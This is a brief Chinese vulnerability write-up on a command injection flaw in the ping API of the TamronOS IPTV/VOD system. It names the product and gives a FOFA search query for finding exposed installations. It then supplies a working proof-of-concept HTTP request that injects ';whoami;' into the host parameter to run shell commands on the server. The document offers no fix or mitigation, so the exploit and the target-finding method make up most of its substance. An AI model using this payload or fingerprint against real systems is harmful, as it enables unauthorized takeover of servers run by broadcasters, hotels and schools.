# TamronOS IPTV系统ping存在命令执行漏洞

# 一、漏洞简介
TamronOS IPTV/VOD系统是一套基于Linux内核开发的宽带运营商、酒店、学校直播点播一体解决方案。系统提供了多种客户端（Android机顶盒、电视、PC版点播、手机版点播）方便用户通过不同的设备接入。TamronOS IPTV系统ping存在命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ TamronOS IPTV系统

# 三、资产测绘
+ fofa`app="TamronOS-IPTV系统"`
+ 特征

![1706860491374-8545916f-3d24-4853-b41f-e8eff2b2af16.png](./img/tmaUZyNyQBoQjl11/1706860491374-8545916f-3d24-4853-b41f-e8eff2b2af16-092046.png)

# 四、漏洞复现
```plain
POST /api/ping?count=5&host=;whoami; HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 0
Connection: close

```

 ![1706860532468-6f287a9a-0ce8-4de9-8388-66f83d562db2.png](./img/tmaUZyNyQBoQjl11/1706860532468-6f287a9a-0ce8-4de9-8388-66f83d562db2-533809.png)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zy6y35t0g2nad6dw>